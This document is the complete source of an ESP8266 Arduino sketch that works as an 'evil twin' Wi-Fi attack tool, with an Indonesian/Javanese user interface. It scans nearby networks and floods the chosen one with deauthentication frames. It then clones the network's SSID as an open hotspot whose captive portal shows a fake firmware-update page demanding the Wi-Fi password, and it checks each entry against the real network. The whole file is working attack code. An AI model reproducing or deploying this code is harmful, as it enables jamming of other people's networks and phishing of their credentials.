#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

extern "C" {
#include "user_interface.h"
}


typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
}  _Network;


const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }

}

String _correct = "";
String _tryPassword = "";

void setup() {

  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP("KipasanAngin", "manjingbae");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}
void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }

      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'> <style> body{background-color: blanchedalmond;} .content{background-color: aliceblue;max-width: 500px;margin: auto;border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style></head><body><h2>Password yang anda masukan salah..!</h2><p>Silakan, mencoba kembali.</p></body> </html>");
    Serial.println("Password Salah !");
  } else {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'> <style> body{background-color: blanchedalmond;} .content{background-color: aliceblue;max-width: 500px;margin: auto;border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style></head><body><h2>Password Benar</h2></body> </html>");
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP("KipasanAngin", "manjingbae");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    Serial.println("Password Benar");
    Serial.println(_correct);
  }
}

String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style> body{background-color: blanchedalmond;} .content{background-color: aliceblue;max-width: 500px;margin: auto;border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
                   "</head><body><div class='content'>"
                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";

void handleIndex() {

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("KipasanAngin", "manjingbae");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
      } else {
        _html += "<button>Select</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Uwisan Melas Bokatan Glapakan");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Serang Wifi.e Uwong");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Uwisan Hostpotan.e");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Gawe Hostpot");
      _html.replace("{hotspot}", "start");
    }

    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><head><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'> <style> body{background-color: blanchedalmond;} .content{background-color: aliceblue;max-width: 500px;margin: auto;border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style></head><body><h2>Perbaharui perangkat lunak, sedang berlangsung...</h2></body> </html>");
    } else {
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'> <style> body{background-color: blanchedalmond;} .content{background-color: aliceblue;max-width: 500px;margin: auto;border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style></head><body> <div class='content'> <h4>Pembaharuan perangkat lunak '" + _selectedNetwork.ssid + "' terdeteksi, demi kelancaran konektivitas internet anda, harus melakukan pembaharuan perangkat lunak.</h4><form action='/'><label for='password'>Harap Masukan Password Wifi:</label><br>  <input type='text' id='password' name='password' value='' minlength='8'><br>  <input type='submit' value='Konfirmasi'> </form> </body> </html>");
    }
  }

}

void handleAdmin() {

  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("KipasanAngin", "manjingbae");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if ( _networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";

    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
    } else {
      _html += "<button>Select</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "Uwisan Melas Bokatan Glapakan");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "Serang Wifi.e Uwong");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Uwisan Hostpotan.e");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "Gawe Hostpot");
    _html.replace("{hotspot}", "start");
  }


  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div></body></html>";
  webServer.send(200, "text/html", _html);

}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xAA, 0xBB, 0xCC, 0x00, 0x11, 0x22 };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {

    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
    uint8_t probePacket[68] = {
            /*  0 - 1  */ 0x40, 0x00,                                                                   // Type: Probe Request
            /*  2 - 3  */ 0x00, 0x00,                                                                   // Duration: 0 microseconds
            /*  4 - 9  */ 0xff, 0xff,               0xff,               0xff,               0xff, 0xff, // Destination: Broadcast
            /* 10 - 15 */ 0xAA, 0xAA,               0xAA,               0xAA,               0xAA, 0xAA, // Source: random MAC
            /* 16 - 21 */ 0xff, 0xff,               0xff,               0xff,               0xff, 0xff, // BSS Id: Broadcast
            /* 22 - 23 */ 0x00, 0x00,                                                                   // Sequence number (will be replaced by the SDK)
            /* 24 - 25 */ 0x00, 0x20,                                                                   // Tag: Set SSID length, Tag length: 32
            /* 26 - 57 */ 0x20, 0x20,               0x20,               0x20,                           // SSID
            0x20,               0x20,               0x20,               0x20,
            0x20,               0x20,               0x20,               0x20,
            0x20,               0x20,               0x20,               0x20,
            0x20,               0x20,               0x20,               0x20,
            0x20,               0x20,               0x20,               0x20,
            0x20,               0x20,               0x20,               0x20,
            0x20,               0x20,               0x20,               0x20,
            /* 58 - 59 */ 0x01, 0x08, // Tag Number: Supported Rates (1), Tag length: 8
            /* 60 */ 0x82,            // 1(B)
            /* 61 */ 0x84,            // 2(B)
            /* 62 */ 0x8b,            // 5.5(B)
            /* 63 */ 0x96,            // 11(B)
            /* 64 */ 0x24,            // 18
            /* 65 */ 0x30,            // 24
            /* 66 */ 0x48,            // 36
            /* 67 */ 0x6c             // 54
    };
    uint8_t beaconPacket[109] = {
            /*  0 - 3  */ 0x80,   0x00,                 0x00,                 0x00,                                                                         // Type/Subtype: managment beacon frame
            /*  4 - 9  */ 0xFF,   0xFF,                 0xFF,                 0xFF,                 0xFF,                 0xFF,                             // Destination: broadcast
            /* 10 - 15 */ 0x01,   0x02,                 0x03,                 0x04,                 0x05,                 0x06,                             // Source
            /* 16 - 21 */ 0x01,   0x02,                 0x03,                 0x04,                 0x05,                 0x06,                             // Source

            // Fixed parameters
            /* 22 - 23 */ 0x00,   0x00,                                                                                                                     // Fragment & sequence number (will be done by the SDK)
            /* 24 - 31 */ 0x83,   0x51,                 0xf7,                 0x8f,                 0x0f,                 0x00,                 0x00, 0x00, // Timestamp
            /* 32 - 33 */ 0x64,   0x00,                                                                                                                     // Interval: 0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
            /* 34 - 35 */ 0x31,   0x00,                                                                                                                     // capabilities Tnformation

            // Tagged parameters

            // SSID parameters
            /* 36 - 37 */ 0x00,   0x20, // Tag: Set SSID length, Tag length: 32
            /* 38 - 69 */ 0x20,   0x20,                 0x20,                 0x20,
            0x20,                 0x20,                 0x20,                 0x20,
            0x20,                 0x20,                 0x20,                 0x20,
            0x20,                 0x20,                 0x20,                 0x20,
            0x20,                 0x20,                 0x20,                 0x20,
            0x20,                 0x20,                 0x20,                 0x20,
            0x20,                 0x20,                 0x20,                 0x20,
            0x20,                 0x20,                 0x20,                 0x20, // SSID

            // Supported Rates
            /* 70 - 71 */ 0x01,   0x08,                                             // Tag: Supported Rates, Tag length: 8
            /* 72 */ 0x82,                                                          // 1(B)
            /* 73 */ 0x84,                                                          // 2(B)
            /* 74 */ 0x8b,                                                          // 5.5(B)
            /* 75 */ 0x96,                                                          // 11(B)
            /* 76 */ 0x24,                                                          // 18
            /* 77 */ 0x30,                                                          // 24
            /* 78 */ 0x48,                                                          // 36
            /* 79 */ 0x6c,                                                          // 54

            // Current Channel
            /* 80 - 81 */ 0x03,   0x01,                                             // Channel set, length
            /* 82 */ 0x01,                                                          // Current Channel

            // RSN information
            /*  83 -  84 */ 0x30, 0x18,
            /*  85 -  86 */ 0x01, 0x00,
            /*  87 -  90 */ 0x00, 0x0f,                 0xac,                 0x02,
            /*  91 -  92 */ 0x02, 0x00,
            /*  93 - 100 */ 0x00, 0x0f,                 0xac,                 0x04,                 0x00,                 0x0f,                 0xac, 0x04, /*Fix: changed 0x02(TKIP) to 0x04(CCMP) is default. WPA2 with TKIP not supported by many devices*/
            /* 101 - 102 */ 0x01, 0x00,
            /* 103 - 106 */ 0x00, 0x0f,                 0xac,                 0x02,
            /* 107 - 108 */ 0x00, 0x00
    };

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}